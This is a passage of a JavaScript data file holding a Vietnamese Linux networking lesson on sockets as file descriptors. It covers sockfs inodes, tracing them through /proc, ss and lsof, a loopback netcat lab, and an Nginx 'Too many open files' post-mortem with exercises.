/**
 * Dữ liệu Chuyên đề Networking trên Linux
 * GIAI ĐOẠN 0: Linux dưới góc nhìn mạng (Phase 0)
 */

window.NET_PHASE0_DATA = {
  id: "part-net-0",
  number: "Giai đoạn 0",
  title: "Linux dưới góc nhìn mạng",
  level: "Nền tảng",
  badge: "GĐ 0",
  description: "Bản chất: socket là file descriptor, tiến trình nói chuyện với mạng qua kernel, 'mạng' chỉ là trạng thái và cấu hình trong kernel.",
  lessons: [
    {
      id: "net-0-01",
      number: "0.1",
      title: "Triết lý 'Mọi thứ đều là File' & Bản chất Socket trên Linux",
      subtitle: "Giải phẫu Virtual File System (VFS), Inode ảo của sockfs và bảng File Descriptor của tiến trình",
      level: "Nền tảng",
      duration: "90 phút",
      objectives: [
        "Hiểu cặn kẽ triết lý 'Everything is a file' và vai trò trừu tượng hóa của Virtual File System (VFS).",
        "Mô tả chính xác hành trình Kernel cấp phát struct socket, struct sock và gán số File Descriptor (FD) vào tiến trình.",
        "Phân biệt rạch ròi giữa Regular File (lưu trên đĩa cứng) và Socket Inode (nằm trên hệ thống file ảo sockfs trong RAM).",
        "Tự tay truy vết số Inode của Socket từ /proc/<PID>/fd/ đối chiếu với /proc/net/tcp và câu lệnh ss -tulpne.",
        "Hiểu bản chất gốc rễ của sự cố kinh điển 'Too many open files' (EMFILE/ENFILE) trong môi trường tải cao."
      ],
      intuition: {
        title: "Chiếc Ổ Cắm Điện & Ống Dẫn Dữ Liệu Hai Chiều",
        metaphor: "Hãy tưởng tượng hệ điều hành Linux giống như một tòa nhà được thiết kế theo chuẩn cơ sở hạ tầng duy nhất: mọi thiết bị tiêu thụ hay cung cấp tài nguyên đều phải cắm vào một 'cổng cắm tiêu chuẩn' (File Descriptor). Khi chương trình của bạn muốn đọc một tệp văn bản trên ổ SSD, nó cắm vào cổng số 3 và gọi lệnh read(). Khi chương trình muốn nói chuyện với máy chủ ở New York qua sợi cáp quang biển, nó cũng chỉ việc cắm vào cổng số 4 và gọi đúng hàm read() đó! 'Socket' chính là chiếc ổ cắm ma thuật: bên ngoài nhìn vào chỉ là một đầu cắm (FD), nhưng bên trong tường (Kernel RAM), nó nối vào một hệ thống bơm hút hai chiều phức tạp gồm hàng đợi gửi (Tx Queue), hàng đợi nhận (Rx Queue) và vi mạch card mạng.",
        visualHtml: `
          <div class="net-arch-box">
            <div class="net-arch-header">
              <span class="net-arch-icon">🔌</span>
              <span class="net-arch-title">KIẾN TRÚC ÁNH XẠ: USER SPACE FD ➔ VFS INODE ➔ NETWORK STACK</span>
            </div>
            <div class="net-arch-layers">
              <div class="net-arch-layer layer-userspace">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">👤 Không Gian Người Dùng (User Space — Python, Nginx, cURL)</span>
                  <span class="net-arch-layer-badge">Ring 3 (Unprivileged)</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Tạo Socket:</strong> <code>int fd = socket(AF_INET, SOCK_STREAM, 0); // Trả về fd = 3</code></div>
                  <div class="net-arch-node"><strong>I/O Stream:</strong> <code>write(3, "GET / HTTP/1.1\\r\\n", 16);</code></div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Lời gọi hệ thống (System Call: socket, read, write) chuyển ngữ cảnh sang Kernel</div>

              <div class="net-arch-layer layer-vfs">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">📁 Virtual File System (VFS) &amp; Phân vùng RAM sockfs</span>
                  <span class="net-arch-layer-badge">VFS Layer (RAM Only)</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Process Table:</strong> <code>task_struct-&gt;files-&gt;fd_array[3]</code> trỏ tới <code>struct file</code></div>
                  <div class="net-arch-node"><strong>Bảng hàm f_op:</strong> Gán bằng <code>&amp;socket_file_ops</code> (ánh xạ read/write sang mạng)</div>
                  <div class="net-arch-node"><strong>Pseudo Inode:</strong> <code>struct inode in sockfs</code> ➔ Định danh Inode ảo: <code>socket:[289145]</code></div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Trừu tượng hóa Socket BSD (BSD Socket Subsystem)</div>

              <div class="net-arch-layer layer-netstack">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">🧠 Linux Kernel Network Stack (Giao thức TCP/IP L4 &amp; L3)</span>
                  <span class="net-arch-layer-badge">Kernel Core</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Tầng Socket BSD:</strong> <code>struct socket</code> (Quản lý trạng thái kết nối tầng ứng dụng)</div>
                  <div class="net-arch-node"><strong>Tầng Giao thức Mạng:</strong> <code>struct sock</code> (IP:Port, TCP State = <code>TCP_ESTABLISHED</code>)</div>
                  <div class="net-arch-node"><strong>Bộ đệm Hàng đợi:</strong> <code>sk_receive_queue</code> (Rx) &amp; <code>sk_write_queue</code> (Tx) chứa chuỗi <code>sk_buff</code></div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Trình điều khiển Card mạng (Device Driver &amp; DMA Ring Buffer)</div>

              <div class="net-arch-layer layer-hardware">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">⚡ Card Mạng Vật Lý (Network Interface Card - NIC / PHY)</span>
                  <span class="net-arch-layer-badge">L1 &amp; L2 Hardware</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Bộ đệm DMA phần cứng:</strong> Rx/Tx Ring Buffer truyền nhận trực tiếp với RAM qua DMA</div>
                  <div class="net-arch-node"><strong>Môi trường truyền dẫn:</strong> Cáp xoắn đôi RJ45 Ethernet / Cáp quang / Sóng Wi-Fi 802.11</div>
                </div>
              </div>
            </div>
          </div>
        `
      },
      sections: [
        {
          id: "sec-problem",
          title: "Vấn đề thực tế: Nếu không có Socket và 'Mọi thứ đều là File'?",
          content: `
            <p>Trong thời kỳ sơ khai của khoa học máy tính (trước khi kiến trúc Unix ra đời), các nhà phát triển phần mềm phải đối mặt với một cơn ác mộng: <strong>Mỗi thiết bị phần cứng đều có tập lệnh và giao diện lập trình (API) hoàn toàn riêng biệt</strong>.</p>
            <ul>
              <li>Nếu bạn muốn ghi dữ liệu ra băng từ (Tape drive), bạn phải gọi hàm điều khiển khối băng từ.</li>
              <li>Nếu bạn muốn in văn bản ra máy in ma trận kim, bạn phải gọi một thư viện khác với tập thanh ghi khác.</li>
              <li>Nếu bạn muốn gửi dữ liệu qua card mạng, bạn phải tự can thiệp vào bộ đệm của chip mạng cụ thể (ví dụ card mạng Novell hay 3Com).</li>
            </ul>
            <p>Hậu quả là: <em>Không có tính tái sử dụng, không thể chuyển hướng luồng dữ liệu (I/O Redirection), và không thể có khái niệm đường ống (Pipe - <code>|</code>)</em>. Bạn không thể viết một chương trình đơn giản lấy đầu ra của một tiến trình và bắn thẳng qua card mạng sang máy khác nếu không viết lại hàng ngàn dòng code giao tiếp phần cứng.</p>
            <p>Năm 1983, nhóm nghiên cứu tại Đại học California, Berkeley đã đưa ra một phát minh thay đổi lịch sử Internet trong bản phân phối <strong>4.2BSD Unix</strong>: <strong>BSD Socket API</strong>. Họ tích hợp trừu tượng mạng vào triết lý cốt lõi của Unix: <em>Biến kết nối mạng thành một File Descriptor (FD)</em>. Nhờ đó, một ứng dụng có thể dùng chung các hàm vào/ra tiêu chuẩn (<code>read</code>, <code>write</code>, <code>close</code>, <code>poll</code>) cho cả file lưu trên đĩa lẫn gói tin chạy trên đường dây mạng xuyên đại lục!</p>
          `
        },
        {
          id: "sec-mechanism",
          title: "Cơ chế kỹ thuật: Hành trình 4 bước Kernel cấp phát Socket",
          content: `
            <p>Khi tiến trình của bạn thực hiện lời gọi hệ thống (Syscall) tạo socket trong ngôn ngữ C hoặc Python:</p>
            <pre class="code-pre"><code>int sockfd = socket(AF_INET, SOCK_STREAM, 0);</code></pre>
            <p>Hãy xem chính xác những gì xảy ra bên dưới không gian nhân (Kernel Space) của Linux:</p>

            <div class="net-topo-box">
              <div class="net-topo-title">⚙️ QUY TRÌNH 4 BƯỚC CỦA KERNEL KHI GỌI SYSCALL socket()</div>
              <ol style="margin:0;padding-left:20px;line-height:1.7;">
                <li><strong>Khởi tạo đối tượng Socket:</strong> Kernel gọi hàm <code>sock_alloc()</code>, cấp phát một cấu trúc <code>struct socket</code> (đại diện cho tầng socket BSD) và một <code>struct sock</code> (chứa toàn bộ trạng thái mạng: IP, Port, cửa sổ trượt, hàng đợi gói tin <code>sk_buff</code>).</li>
                <li><strong>Cấp phát Inode trên hệ thống file ảo <code>sockfs</code>:</strong> Linux có một filesystem ẩn trong RAM tên là <code>sockfs</code>. Kernel tạo một Inode mới trên <code>sockfs</code> và gắn kết với socket. Inode này được cấp một số định danh duy nhất (Inode Number), ví dụ: <code>289145</code>. Tên hiển thị của file này sẽ có dạng: <code>socket:[289145]</code>.</li>
                <li><strong>Tạo đối tượng File VFS (Virtual File System):</strong> Kernel gọi <code>alloc_file_pseudo()</code> để tạo một <code>struct file</code>. Điểm mấu chốt nằm ở đây: biến con trỏ bảng hàm <code>f_op</code> (File Operations) của struct này KHÔNG trỏ tới driver ổ cứng (như ext4 hay xfs), mà được gán bằng <code>socket_file_ops</code>:
                  <ul style="margin:4px 0 8px 16px;">
                    <li>Lời gọi <code>read()</code> ➔ được ánh xạ thành <code>sock_read_iter()</code> ➔ đọc dữ liệu từ hàng đợi <code>sk_receive_queue</code>.</li>
                    <li>Lời gọi <code>write()</code> ➔ được ánh xạ thành <code>sock_write_iter()</code> ➔ đẩy dữ liệu vào <code>sk_write_queue</code> rồi xuống card mạng.</li>
                  </ul>
                </li>
                <li><strong>Cấp phát File Descriptor (FD) nhỏ nhất còn trống:</strong> Kernel duyệt qua bảng <code>fdtable</code> của tiến trình (trong <code>current->files</code>), tìm chỉ số nguyên dương nhỏ nhất chưa dùng (thường là 3, vì 0 là stdin, 1 là stdout, 2 là stderr). Kernel gán con trỏ <code>fd_array[3]</code> trỏ tới <code>struct file</code> ở bước 3, rồi trả số nguyên <code>3</code> về cho người dùng.</li>
              </ol>
            </div>

            <p>Sau 4 bước trên, đối với tiến trình trong User Space, nó chỉ cầm trong tay một con số nguyên đơn giản: <code>3</code>. Nhưng đối với Kernel, số 3 đó là chiếc chìa khóa dẫn thẳng tới toàn bộ Network Stack của hệ điều hành!</p>
          `
        },
        {
          id: "sec-walkthrough",
          title: "Ví dụ đối chiếu: Khám nghiệm Inode qua 4 lăng kính Linux",
          content: `
            <p>Để chứng minh tính xác thực và không học vẹt, chúng ta sẽ thực hiện một cuộc khám nghiệm sống trên một máy chủ Linux thực tế:</p>
            <p>Giả sử chúng ta khởi chạy một tiến trình Web Server lắng nghe trên cổng <code>8080</code> với mã định danh tiến trình <code>PID = 4125</code>.</p>

            <div class="net-matrix-table-wrap">
              <table class="net-matrix-table">
                <thead>
                  <tr>
                    <th>Góc nhìn kiểm tra</th>
                    <th>Nơi quan sát trong Linux</th>
                    <th>Giá trị quan sát được</th>
                    <th>Ý nghĩa bản chất tầng sâu</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Tiến trình (FD Table)</strong></td>
                    <td><code>/proc/4125/fd/3</code></td>
                    <td class="net-highlight-cell">socket:[289145]</td>
                    <td>FD số 3 trong bảng chỉ mục là symlink trỏ trực tiếp tới Inode mạng 289145 trên phân vùng RAM ảo sockfs.</td>
                  </tr>
                  <tr>
                    <td><strong>VFS Inode Metadata</strong></td>
                    <td><code>stat -L /proc/4125/fd/3</code></td>
                    <td class="net-highlight-cell">Device: 0,10 / Inode: 289145</td>
                    <td>Thiết bị 0,10 là mã của driver sockfs. Inode này không chiếm bất kỳ sector nào trên ổ đĩa SSD/HDD.</td>
                  </tr>
                  <tr>
                    <td><strong>Kernel Network State</strong></td>
                    <td><code>/proc/net/tcp</code></td>
                    <td class="net-highlight-cell">local: 00000000:1F90 / ino: 289145</td>
                    <td>Cổng 1F90 (hệ thập lục phân hex) = 8080 (dec). Trạng thái 0A tương ứng với TCP_LISTEN. Inode khớp 100%.</td>
                  </tr>
                  <tr>
                    <td><strong>Công cụ Socket CLI</strong></td>
                    <td><code>ss -tulpne</code></td>
                    <td class="net-highlight-cell">*:8080 ino:289145 sk:ffff8801...</td>
                    <td>Lệnh ss gửi yêu cầu qua giao diện Netlink của Kernel để gom chính xác Inode 289145 và địa chỉ struct sock trong RAM.</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <p>Bảng đối chiếu trên chứng minh sự nhất quán tuyệt đối của Linux: <strong>Không có một thông tin nào là bí ẩn hay vô căn cứ</strong>. Mọi công cụ CLI như <code>netstat</code>, <code>ss</code>, <code>lsof</code> chỉ đơn giản là những người phiên dịch đọc dữ liệu từ cây thư mục <code>/proc</code> và giao diện Netlink của Kernel.</p>
          `
        },
        {
          id: "sec-observe",
          title: "Quan sát trên Linux: Thực thi lệnh và Phân tích từng dòng Output",
          content: `
            <p>Hãy mở một terminal Linux (trên Ubuntu, Debian, CentOS hoặc WSL2) và tự tay thực hiện chuỗi lệnh sau:</p>
          `,
          codeExamples: [
            {
              title: "Bước 1: Khởi động một tiến trình lắng nghe mạng trong background",
              lang: "Bash",
              code: "# Khởi động Web server Python mẫu lắng nghe trên cổng 9090\npython3 -m http.server 9090 > /dev/null 2>&1 &\n\n# Lấy PID của tiến trình vừa chạy nền\nSERVER_PID=$!\necho \"PID của Web Server: $SERVER_PID\"",
              output: "PID của Web Server: 4892",
              annotations: [
                { line: 2, text: "Chạy module http.server trên cổng 9090, đẩy log ra /dev/null để tránh rác terminal." },
                { line: 5, text: "Biến $! trong Bash tự động lưu trữ PID của lệnh chạy nền gần nhất." }
              ]
            },
            {
              title: "Bước 2: Liệt kê bảng File Descriptor của tiến trình",
              lang: "Bash",
              code: "# Xem danh sách các file descriptor mà tiến trình 4892 đang mở\nls -l /proc/$SERVER_PID/fd/",
              output: "total 0\nlrwx------ 1 student student 64 Oct 30 20:50 0 -> /dev/null\nlrwx------ 1 student student 64 Oct 30 20:50 1 -> /dev/null\nlrwx------ 1 student student 64 Oct 30 20:50 2 -> /dev/null\nlrwx------ 1 student student 64 Oct 30 20:50 3 -> 'socket:[312048]'",
              annotations: [
                { line: 3, text: "FD 0 (stdin) trỏ vào /dev/null do ta đã chuyển hướng." },
                { line: 4, text: "FD 1 (stdout) cũng trỏ vào /dev/null." },
                { line: 6, text: "FD 3 chính là Socket lắng nghe! Số Inode được kernel cấp là 312048." }
              ]
            },
            {
              title: "Bước 3: Dùng ss và lsof để đối chiếu số Inode 312048",
              lang: "Bash",
              code: "# Dùng ss với cờ -e (extended) để in số Inode\nss -tulpne | grep 9090\n\n# Dùng lsof để kiểm tra góc nhìn từ tiến trình\nlsof -i :9090",
              output: "tcp   LISTEN 0      5            0.0.0.0:9090       0.0.0.0:*    users:((\"python3\",pid=4892,fd=3)) ino:312048 sk:14a0 <->\nCOMMAND   PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npython3  4892 student    3u  IPv4 312048      0t0  TCP *:9090 (LISTEN)",
              annotations: [
                { line: 2, text: "Cờ -t (TCP), -u (UDP), -l (Listening), -p (Process), -n (Numeric), -e (Extended info)." },
                { line: 3, text: "Chú ý trường ino:312048 và fd=3: hoàn toàn khớp với tệp /proc/4892/fd/3!" },
                { line: 6, text: "lsof hiển thị rõ cột FD là 3u (3: descriptor số 3, u: chế độ đọc/ghi read/write), NODE: 312048." }
              ]
            }
          ]
        },
        {
          id: "sec-lab",
          title: "Phòng Lab thực hành: Bắt quả tang Vòng đời Socket Inode",
          content: `
            <div class="net-topo-box">
              <div class="net-topo-title">🧪 PHÒNG LAB THỰC HÀNH 0.1: BẮT QUẢ TANG VÒNG ĐỜI SOCKET INODE</div>
              <p><strong>Mục tiêu:</strong> Tự tay quan sát khoảnh khắc một Socket Inode được sinh ra khi mở cổng, một Connected Socket Inode thứ hai được tạo khi có client kết nối, và toàn bộ bị Kernel thu hồi dọn dẹp khi tiến trình đóng lại.</p>
              <p><strong>Môi trường &amp; Công cụ:</strong> Mọi máy Linux (Ubuntu/Debian/CentOS/WSL2). Công cụ: <code>nc</code> (netcat), <code>ss</code>, <code>ls</code>, <code>kill</code>.</p>
            </div>

            <div class="net-step-card">
              <div class="net-step-header">
                <span class="net-step-badge">BƯỚC 1</span>
                <h4 class="net-step-title">Khởi tạo Socket lắng nghe (Server) trong Background</h4>
              </div>
              <p class="net-step-desc">Mở Terminal 1 và sử dụng công cụ netcat để mở một cổng lắng nghe TCP tại địa chỉ loopback <code>127.0.0.1:7777</code>, đồng thời lưu lại mã PID của tiến trình chạy nền:</p>
              <pre class="code-pre"><code>nc -l -k 127.0.0.1 7777 &amp;
SERVER_PID=$!
echo "Server PID: $SERVER_PID"</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Cách kiểm tra bạn làm đúng:</strong> Biến <code>$SERVER_PID</code> in ra một số nguyên dương (ví dụ: <code>4892</code>). Kiểm tra lệnh <code>ps -fp $SERVER_PID</code> xác nhận tiến trình <code>nc</code> đang chạy.</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-header">
                <span class="net-step-badge">BƯỚC 2</span>
                <h4 class="net-step-title">Truy vết Inode của Listening Socket trong /proc</h4>
              </div>
              <p class="net-step-desc">Khám nghiệm bảng File Descriptor của tiến trình Server để tìm xem kernel đã cấp số Inode nào cho socket lắng nghe vừa mở:</p>
              <pre class="code-pre"><code>ls -l /proc/$SERVER_PID/fd/</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Cách kiểm tra bạn làm đúng:</strong> Bạn sẽ thấy FD <code>3</code> là một symlink trỏ tới <code>socket:[450123]</code> (số Inode thực tế trên máy bạn sẽ khác). Hãy ghi nhớ con số này!</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-header">
                <span class="net-step-badge">BƯỚC 3</span>
                <h4 class="net-step-title">Mở một kết nối Client tới Server qua cổng 7777</h4>
              </div>
              <p class="net-step-desc">Mở Terminal 2 (hoặc mở tiến trình nền thứ hai) và chủ động kết nối tới cổng 7777 của Server:</p>
              <pre class="code-pre"><code>nc 127.0.0.1 7777 &amp;
CLIENT_PID=$!
echo "Client PID: $CLIENT_PID"</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Cách kiểm tra bạn làm đúng:</strong> Tiến trình Client chạy nền thành công và không bị thông báo lỗi <code>Connection refused</code>.</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-header">
                <span class="net-step-badge">BƯỚC 4</span>
                <h4 class="net-step-title">Khám phá sự phân tách giữa Listening Socket và Connected Socket</h4>
              </div>
              <p class="net-step-desc">Quay lại Terminal 1 và kiểm tra lại thư mục File Descriptor của tiến trình Server để quan sát điều kỳ diệu:</p>
              <pre class="code-pre"><code>ls -l /proc/$SERVER_PID/fd/</code></pre>
              <p class="net-step-desc" style="margin-top:8px;">Bây giờ bạn sẽ thấy xuất hiện <strong>HAI socket đồng thời</strong> trong cùng một tiến trình Server:</p>
              <pre class="code-pre"><code># 3 -&gt; socket:[450123]   &lt;-- Listening Socket (vẫn đang nghe cổng 7777 đón khách mới)
# 4 -&gt; socket:[450189]   &lt;-- Connected Socket (MỚI SINH RA để độc quyền nói chuyện với client!)</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Phát hiện bản chất cốt lõi:</strong> Listening Socket KHÔNG trực tiếp truyền nhận dữ liệu ứng dụng. Khi một client kết nối thành công qua bắt tay 3 bước, Kernel nhân bản ra một <strong>Connected Socket riêng biệt (FD 4)</strong> để phụ trách truyền nhận, giải phóng Listening Socket (FD 3) để tiếp tục đón nhận các kết nối tiếp theo!</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-header">
                <span class="net-step-badge">BƯỚC 5</span>
                <h4 class="net-step-title">Thu hồi tài nguyên và Kiểm chứng dọn dẹp Inode</h4>
              </div>
              <p class="net-step-desc">Tiêu diệt cả hai tiến trình và kiểm tra xem Kernel Linux thu hồi Socket Inode ra sao:</p>
              <pre class="code-pre"><code>kill -9 $SERVER_PID $CLIENT_PID 2&gt;/dev/null
ss -tulpn | grep 7777</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Cách kiểm tra bạn làm đúng:</strong> Lệnh <code>ss</code> không còn trả về bất kỳ kết quả nào cho cổng 7777. Các Inode <code>450123</code> và <code>450189</code> bị kernel giải phóng hoàn toàn khỏi RAM sockfs.</span>
              </div>
            </div>
          `
        },
        {
          id: "sec-production",
          title: "Môi trường Production: Bệnh án kinh điển 'Too many open files'",
          content: `
            <div class="net-postmortem-card">
              <div class="net-postmortem-header">
                <span class="net-postmortem-badge">SRE POST-MORTEM</span>
                <span class="net-postmortem-title">Hồ Sơ Sự Cố: Nginx Đột Ngột Trả Về Lỗi 500 &amp; Drop Hàng Ngàn Kết Nối</span>
              </div>
              <div class="net-postmortem-body">
                <p><strong>🚨 Bối cảnh sự cố:</strong> Trong một chiến dịch Flash Sale lớn của trang thương mại điện tử, cụm Nginx Reverse Proxy tiếp nhận lưu lượng đỉnh lên tới 50.000 yêu cầu/giây. Đột ngột, hàng ngàn người dùng mới bắt đầu nhận thông báo lỗi kết nối hoặc <code>HTTP 502/500</code>. Đội ngũ trực ban (On-call) kiểm tra máy chủ nhận thấy:</p>
                <ul>
                  <li>Mức tiêu thụ CPU chỉ ở mức 25% (hoàn toàn bình thường).</li>
                  <li>Dung lượng RAM còn trống hơn 16 GB.</li>
                  <li>Băng thông card mạng mới sử dụng khoảng 30% công suất tối đa.</li>
                </ul>

                <p style="margin-top:12px;"><strong>💥 Triệu chứng trích xuất từ Nginx Error Log:</strong></p>
                <div class="net-log-terminal">2026/10/30 20:30:12 [alert] 1204#1204: *40960 accept4() failed (24: Too many open files) while accepting new connection
2026/10/30 20:30:12 [alert] 1204#1204: *40961 socket() failed (24: Too many open files) while connecting to upstream
2026/10/30 20:30:13 [error] 1204#1204: *40962 open() "/var/log/nginx/access.log" failed (24: Too many open files)</div>

                <p><strong>🔍 Phân tích nguyên nhân gốc rễ (Root Cause Analysis):</strong></p>
                <ul>
                  <li>Mỗi kết nối TCP từ khách hàng tới Nginx là <strong>1 Socket File Descriptor</strong>.</li>
                  <li>Để chuyển tiếp yêu cầu đó tới backend (FastAPI/Go/NodeJS), Nginx mở tiếp <strong>1 Socket File Descriptor thứ hai</strong>.</li>
                  <li>Trên Linux, mỗi tiến trình người dùng mặc định bị giới hạn số lượng File Descriptor tối đa qua tham số <code>nofile</code> (mặc định chỉ là 1024).</li>
                  <li>Khi Nginx mở tới 1024 file descriptors (bao gồm file log, thư viện động <code>.so</code> và socket kết nối mạng), Kernel lập tức từ chối syscall <code>accept4()</code> và trả về mã lỗi <code>EMFILE (Error 24: Too many open files)</code>!</li>
                </ul>

                <p style="margin-top:14px;"><strong>💊 Phác đồ điều trị triệt để của Kiến trúc sư Hạ tầng:</strong></p>
                <ol class="net-treatment-list">
                  <li>
                    <strong>Kiểm tra giới hạn hiện hành của tiến trình:</strong>
                    <pre class="code-pre" style="margin:6px 0;"><code>cat /proc/$(pgrep -o nginx)/limits | grep "Max open files"</code></pre>
                  </li>
                  <li>
                    <strong>Nâng ngưỡng giới hạn mềm (soft) và cứng (hard) trong cấu hình hệ thống:</strong>
                    <p style="margin:4px 0;font-size:0.86rem;">Thêm vào cuối tệp <code>/etc/security/limits.conf</code>:</p>
                    <pre class="code-pre" style="margin:6px 0;"><code>nginx soft nofile 65535
nginx hard nofile 65535</code></pre>
                  </li>
                  <li>
                    <strong>Khai báo chỉ thị mở rộng FD trực tiếp trong Nginx Master:</strong>
                    <p style="margin:4px 0;font-size:0.86rem;">Thêm vào phạm vi main context của <code>/etc/nginx/nginx.conf</code>:</p>
                    <pre class="code-pre" style="margin:6px 0;"><code>worker_rlimit_nofile 65535;</code></pre>
                  </li>
                  <li>
                    <strong>Nâng trần toàn hệ thống Kernel Linux (System-wide file-max):</strong>
                    <pre class="code-pre" style="margin:6px 0;"><code>sudo sysctl -w fs.file-max=2097152
# Lưu vĩnh viễn vào /etc/sysctl.conf để không mất sau khi reboot
echo "fs.file-max = 2097152" | sudo tee -a /etc/sysctl.conf</code></pre>
                  </li>
                </ol>
              </div>
            </div>
          `
        }
      ],
      callouts: {
        pitfalls: [
          {
            title: "Nhầm lẫn giữa Internet Socket (AF_INET) và UNIX Domain Socket (AF_UNIX)",
            content: "Nhiều người thấy file `/tmp/mysql.sock` hoặc `/run/gunicorn.sock` trên ổ đĩa và tưởng rằng mọi socket mạng đều có file như vậy. Không phải! UNIX Domain Socket (AF_UNIX) dùng để giao tiếp nội bộ trong cùng 1 máy tính và dùng đường dẫn file làm điểm hẹn. Trong khi đó, Internet Socket (AF_INET/AF_INET6) giao tiếp qua IP/Port và hoàn toàn KHÔNG tồn tại bất kỳ tệp vật lý nào trên ổ cứng! Chúng chỉ tồn tại dưới dạng Inode ảo trên sockfs trong RAM."
          },
          {
            title: "Rò rỉ File Descriptor (Socket Leak) trong code ứng dụng",
            content: "Nếu lập trình viên mở socket (`s = socket.socket()`) hoặc nhận kết nối (`conn, addr = s.accept()`) mà quên gọi `conn.close()` trong khối `finally:` khi gặp exception, Socket Inode đó sẽ bị kẹt vĩnh viễn trong kernel table cho đến khi tiến trình chết. Lâu ngày, server sẽ dính lỗi EMFILE dù traffic thực tế đang rất thấp."
          }
        ],
        tips: [
          {
            title: "Tra cứu nhanh số lượng file descriptor một tiến trình đang mở",
            content: "Gõ lệnh `ls -1 /proc/<PID>/fd | wc -l` để biết ngay tiến trình đó đang giữ bao nhiêu file descriptor (bao gồm file, socket, pipe, timerfd)."
          },
          {
            title: "Kiểm tra số lượng socket toàn hệ thống theo thời gian thực",
            content: "Tệp `/proc/net/sockstat` cung cấp cái nhìn tổng quan cực nhanh về số lượng socket TCP/UDP đang được kernel quản lý mà không gây tốn tài nguyên hệ thống như khi quét bảng ps."
          }
        ]
      },
      exercises: [
        {
          level: "Dễ",
          title: "Đếm số lượng Socket Inode của một dịch vụ hệ thống",
          problem: "Hãy dùng một chuỗi lệnh Linux kết hợp giữa `ls`, `grep` và `wc` để đếm xem tiến trình `systemd-resolved` đang sở hữu bao nhiêu File Descriptor loại `socket`.",
          hint: "Hãy dùng lệnh `pgrep` để lấy PID của systemd-resolved, sau đó kiểm tra danh sách symbolic link trong `/proc/<PID>/fd/`.",
          solutionCode: "RESOLVED_PID=$(pgrep -x systemd-resolved)\nls -l /proc/$RESOLVED_PID/fd | grep 'socket:' | wc -l",
          solutionOutput: "4",
          explanation: "Lệnh `ls -l` liệt kê các file descriptor và đích đến của symlink. Tiến trình `systemd-resolved` mở các socket DNS (cổng 53 UDP/TCP và cổng 5355 LLMNR). Bộ lọc `grep 'socket:'` chỉ giữ lại các dòng là kết nối mạng, và `wc -l` đếm tổng số dòng đó."
        },
        {
          level: "Vừa",
          title: "Tìm tiến trình chiếm giữ nhiều Socket nhất trên máy tính",
          problem: "Viết một câu lệnh shell script một dòng (one-liner) quét qua tất cả các tiến trình trong `/proc/` và in ra top 3 tiến trình đang mở nhiều Socket FD nhất trên toàn hệ thống.",
          hint: "Duyệt qua `/proc/[0-9]*/fd`, đếm số lượng link trỏ tới `socket:`, gom nhóm theo tên tiến trình và sắp xếp giảm dần.",
          solutionCode: "for fd_dir in /proc/[0-9]*/fd; do\n  pid=$(echo $fd_dir | cut -d/ -f3)\n  count=$(ls -l $fd_dir 2>/dev/null | grep -c 'socket:')\n  if [ $count -gt 0 ]; then\n    name=$(cat /proc/$pid/comm 2>/dev/null)\n    echo \"$count $name (PID: $pid)\"\n  fi\ndone | sort -rn | head -n 3",
          solutionOutput: "148 nginx (PID: 1204)\n34 python3 (PID: 4892)\n12 systemd-resolved (PID: 512)",
          explanation: "Script duyệt qua các thư mục `/proc/<PID>/fd`, sử dụng `grep -c 'socket:'` để đếm số socket của từng PID, đọc tên tiến trình từ `/proc/<PID>/comm`, sau đó dùng `sort -rn` để xếp từ cao xuống thấp và lấy ra 3 tiến trình đứng đầu."
        },
        {
          level: "Thử thách",
          title: "Xử lý sự cố 'Cổng mạng bị chiếm giữ bởi tiến trình ma'",
          problem: "Bạn vừa dừng ứng dụng Web của mình bằng lệnh `systemctl stop myapp`, nhưng khi khởi động lại thì ứng dụng báo lỗi: `OSError: [Errno 98] Address already in use: ('0.0.0.0', 8080)`. Lệnh `ps aux | grep myapp` không thấy tiến trình nào chạy. Làm thế nào để tìm ra chính xác PID của tiến trình đang 'ngậm' chiếc Socket Inode này và xử lý dứt điểm?",
          hint: "Tiến trình con được `fork()` từ myapp có thể đã kế thừa Socket FD và vẫn đang chạy nền dù tiến trình cha đã chết. Hãy dùng `ss` hoặc `fuser` hoặc `lsof`.",
          solutionCode: "# Bước 1: Dò tìm PID đang giữ socket trên cổng 8080\nsudo ss -tulpn '( sport = :8080 )'\n# Hoặc dùng lsof / fuser:\nsudo fuser 8080/tcp\n\n# Bước 2: Quan sát cây tiến trình để hiểu vì sao nó tồn tại\nsudo ps -fp $(sudo fuser 8080/tcp 2>/dev/null)\n\n# Bước 3: Diệt tiến trình cứng đầu để giải phóng Inode\nsudo fuser -k 8080/tcp",
          solutionOutput: "8080/tcp:            5192\nUID   PID  PPID  C STIME TTY      TIME CMD\nroot 5192     1  0 20:15 ?    00:00:01 worker_child --daemon\n8080/tcp:            5192 (killed)",
